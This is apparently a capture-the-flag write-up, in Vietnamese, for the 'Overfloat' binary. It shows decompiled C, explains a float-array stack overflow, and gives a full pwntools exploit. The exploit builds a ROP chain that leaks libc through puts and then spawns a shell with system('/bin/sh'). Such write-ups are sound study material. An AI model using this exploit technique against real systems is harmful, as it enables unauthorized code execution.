# Overfloat

## Mitigation

```text
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x3ff000)
    RUNPATH:  b'.'
```

## source code

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char s[48]; // [rsp+10h] [rbp-30h] BYREF

  setbuf(_bss_start, 0LL);
  setbuf(stdin, 0LL);
  alarm(0x1Eu);
  __sysv_signal(14, timeout);
  puts(
    "                                 _ .--.        \n"
    "                                ( `    )       \n"
    "                             .-'      `--,     \n"
    "                  _..----.. (             )`-. \n"
    "                .'_|` _|` _|(  .__,           )\n"
    "               /_|  _|  _|  _(        (_,  .-' \n"
    "              ;|  _|  _|  _|  '-'__,--'`--'    \n"
    "              | _|  _|  _|  _| |               \n"
    "          _   ||  _|  _|  _|  _|               \n"
    "        _( `--.\\_|  _|  _|  _|/               \n"
    "     .-'       )--,|  _|  _|.`                 \n"
    "    (__, (_      ) )_|  _| /                   \n"
    "      `-.__.\\ _,--'\\|__|__/                  \n"
    "                    ;____;                     \n"
    "                     \\YT/                     \n"
    "                      ||                       \n"
    "                     |\"\"|                    \n"
    "                     '=='                      \n"
    "\n"
    "WHERE WOULD YOU LIKE TO GO?");
  memset(s, 0, 0x28uLL);
  chart_course(s);
  puts("BON VOYAGE!");
  return 0;
}
```

```c
__int64 __fastcall chart_course(__int64 a1)
{
  __int64 result; // rax
  float v2; // xmm1_4
  char s[104]; // [rsp+10h] [rbp-70h] BYREF
  float v4; // [rsp+78h] [rbp-8h]
  int i; // [rsp+7Ch] [rbp-4h]

  for ( i = 0; ; ++i )
  {
    if ( (i & 1) != 0 )
      printf("LON[%d]: ", (unsigned int)(i / 2 % 10));
    else
      printf("LAT[%d]: ", (unsigned int)(i / 2 % 10));
    fgets(s, 100, stdin);
    if ( !strncmp(s, "done", 4uLL) )
      break;
    v2 = atof(s);
    v4 = v2;
    memset(s, 0, 0x64uLL);
    *(float *)(4LL * i + a1) = v4;
LABEL_9:
    ;
  }
  result = i & 1;
  if ( (i & 1) != 0 )
  {
    puts("WHERES THE LONGITUDE?");
    --i;
    goto LABEL_9;
  }
  return result;
}
```

## vulnerability

Ở hàm main có khởi tạo mảng `s[48]` sau đó địa chỉ hàm này được truyền vào hàm`chart_course(__int64 a1)` sau đó sẽ có 1 vòng lặp vô hạn dùng để nhập một số thực vào địa chỉ `4LL * i + a1`. Vòng lặp chỉ dừng lại khi ta nhập chữ "done". Vậy nếu ta nhập lớn hơn 12 số thực thì sẽ ghi đè lên vùng nhớ cạnh mảng `s[48]` và có thể ghi đè lên địa chỉ trả về của hàm `main`.

## exploit

```python
p = start()
libc = ELF('./libc.so.6', checksec=False)
rop = ROP(elf)
# fill up to return address
for i in range(0,14):
    p.sendlineafter(b']:', str(struct.unpack('f', p32(i))[0]).encode())

# overwrite return address
# write 4 byte lower first then 4 byte higher
# pop rdi; ret
p.sendlineafter(b']:', str(struct.unpack('f', p32(0x00400a83))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())
# puts got
p.sendlineafter(b']:', str(struct.unpack('f', p32(elf.got['puts']))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())
# puts plt
p.sendlineafter(b']:', str(struct.unpack('f', p32(elf.plt['puts']))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())
# main
p.sendlineafter(b']:', str(struct.unpack('f', p32(0x400993))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())
p.sendlineafter(b']:', b'done')
# leak libc
p.recvuntil(b'BON VOYAGE!\n')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.symbols['puts']
log.info('libc base: ' + hex(libc.address))

# overwrite return address
for i in range(0,14):
    p.sendlineafter(b']:', str(struct.unpack('f', p32(i))[0]).encode())
# pop rdi; ret
p.sendlineafter(b']:', str(struct.unpack('f', p32(0x00400a83))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())
# binsh
bin_sh = next(libc.search(b'/bin/sh'))
p.sendlineafter(b']:', str(struct.unpack('f', p32(bin_sh  & 0xffffffff))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32((bin_sh &  0xffffffff00000000) >> 32))[0]).encode())
# ret gadget
p.sendlineafter(b']:', str(struct.unpack('f', p32(0x400661))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32(0))[0]).encode())

# system
p.sendlineafter(b']:', str(struct.unpack('f', p32(libc.symbols['system'] & 0xffffffff))[0]).encode())
p.sendlineafter(b']:', str(struct.unpack('f', p32((libc.symbols['system'] &  0xffffffff00000000) >> 32))[0]).encode())

p.sendlineafter(b']:', b'done')

p.interactive()
```